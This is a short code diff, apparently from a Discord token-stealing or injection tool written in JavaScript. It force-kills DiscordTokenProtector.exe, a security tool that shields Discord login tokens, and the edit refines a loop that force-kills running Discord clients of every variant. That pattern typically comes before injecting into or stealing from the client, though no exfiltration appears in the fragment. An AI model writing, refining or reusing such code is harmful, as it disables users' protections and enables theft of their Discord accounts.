@@ -6,6 +6,6 @@ const dtp = tasks.includes('DiscordTokenProtector.exe');
 if (dtp) exec('taskkill /f /im DiscordTokenProtector.exe');
 
 // Kills every version of Discord running
-['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(app => {
-  exec(`taskkill /f /im ${app}.exe`);
+['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(discord => {
+  if (tasks.includes(discord)) exec(`taskkill /f /im ${discord}.exe`);
 });
